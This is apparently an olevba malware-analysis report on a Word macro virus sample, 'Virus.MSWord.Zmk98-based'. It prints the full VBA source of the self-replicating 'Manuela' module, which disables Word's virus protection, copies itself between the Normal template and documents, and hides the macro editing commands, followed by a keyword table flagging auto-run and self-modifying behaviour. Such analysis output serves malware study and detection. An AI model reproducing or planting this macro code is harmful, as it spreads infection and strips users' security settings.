olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zmk98-based
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Zmk98-based - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Manuela.bas 
in file: Virus.MSWord.Zmk98-based - OLE stream: 'Macros/VBA/Manuela'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExit()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo Bye
   Call PayLoad
Bye:
End Sub
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo Fin
iMacroCount = NormalTemplate.VbProject.VbComponent.Count
For i = 1 To iMacroCount
     If NormalTemplate.VbProject.VbComponent(i).Name = "Manuela" Then
              ManuelaInstalled = -1
     End If
Next i
If Not ManuelaInstalled Then
      Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Manuela", Object:=wdOrganizerObjectProjectItems
Else
     Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Manuela", Object:=wdOrganizerObjectProjectItems
End If
Fin:
End Sub
Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo Finish
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Manuela", Object:=wdOrganizerObjectProjectItems
Finish:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorFT
ErrorFT:
End Sub
Sub PayLoad()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorPL
Assistant.Visible = True
With Assistant.NewBalloon
     .Button = msoButtonSetOK
     .Heading = "Uuuuund ZACK! Hier bin ich!"
     .Text = "Ciao Manuela! II MMIISS YYOOUU!!"
.Show
End With
ErrorPL:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorTM
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
Wordbasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
On Error GoTo ErrorVVBC
ErrorVVBC:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VbProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

